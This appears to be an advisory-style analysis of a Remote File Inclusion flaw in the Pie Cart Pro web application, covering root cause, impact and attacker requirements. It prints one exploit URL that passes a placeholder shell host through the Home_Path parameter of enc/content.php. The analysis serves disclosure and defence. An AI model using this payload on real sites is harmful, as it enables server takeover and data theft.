Based on the provided content, here's an analysis of the vulnerability:

**Root cause of vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) in the "Pie Cart Pro" application. The `content.php` script includes the `Home_Path` parameter without proper sanitization.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application directly includes the file specified by the user-controlled `Home_Path` parameter. This allows an attacker to include a malicious file hosted on a remote server.

**Impact of exploitation:**
- **Arbitrary Code Execution:** By including a malicious PHP file, an attacker can execute arbitrary code on the server where Pie Cart Pro is hosted. This can lead to complete system compromise, data theft, or defacement of the website.

**Attack vectors:**
- **HTTP GET Request:** The vulnerability can be triggered by sending a specially crafted HTTP GET request to the vulnerable `content.php` script with the malicious URL in the `Home_Path` parameter.

**Required attacker capabilities/position:**
- **Network Access:** The attacker needs to have network access to the server hosting the vulnerable application.
- **Ability to host a malicious PHP file:** The attacker needs to control a server where they can host a malicious PHP file that will be included by the vulnerable application.

**Technical Details:**
- The vulnerability lies in the `enc/content.php` file.
- The vulnerable parameter is `Home_Path`.
- The exploit URL format is `http://sitename.com/enc/content.php?Home_Path=http://SHELLURL.COM?`

This exploit allows an attacker to include a remote file, which could be a shell, granting the attacker control over the web server.
